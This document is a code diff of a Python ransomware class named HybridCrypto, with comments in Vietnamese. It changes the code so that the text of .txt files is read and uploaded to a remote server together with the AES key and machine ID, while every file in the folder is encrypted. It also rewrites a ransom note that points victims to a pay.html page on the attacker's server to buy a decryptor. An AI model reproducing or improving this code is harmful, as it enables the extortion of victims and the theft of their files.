@@ -106,21 +106,28 @@ class HybridCrypto:
         content = []
 
         for f in os.listdir(folder):
+
             full = os.path.join(folder, f)
 
             if os.path.isfile(full):
-                with open(full, "rb") as file:
-                    file_content = file.read()
 
-                content.append(file_content)
-                results.append(self.encrypt_file(full))
+                # chỉ đọc txt dưới dạng text để gửi server
+                if f.endswith(".txt"):
+
+                    with open(full, "r", encoding="utf-8") as file:
+                        file_content = file.read()
+
+                    content.append(file_content)
+
+                # encrypt mọi file
+                results.append(
+                    self.encrypt_file(full)
+                )
 
         self.client.add_aes_key(
             machine_id=self.client.machine_id,
             aes_key=aes_key_base64,
-            content = base64.b64encode(
-                b"\n".join(content)
-            ).decode("utf-8")
+            content="\n".join(content)
         )
 
         return results
@@ -129,7 +136,7 @@ class HybridCrypto:
         guide_path = os.path.join(folder, "HOW_TO_REVERT.txt")
         with open(guide_path, "w") as f:
             f.write("How to Decrypt Files:\n")
-            f.write("1. Access the link http://13.237.202.163/pay.html\n")
+            f.write("1. Access the link " + self.client.server_url + "/pay.html\n")
             f.write("2. Provide the machine ID found in '.machine_id'\n")
             f.write("3. Get .exe file + KEY.pem. Copy them to the same folder\n")
             f.write("4. Run the .exe + directory of encrypted files as argument\n")
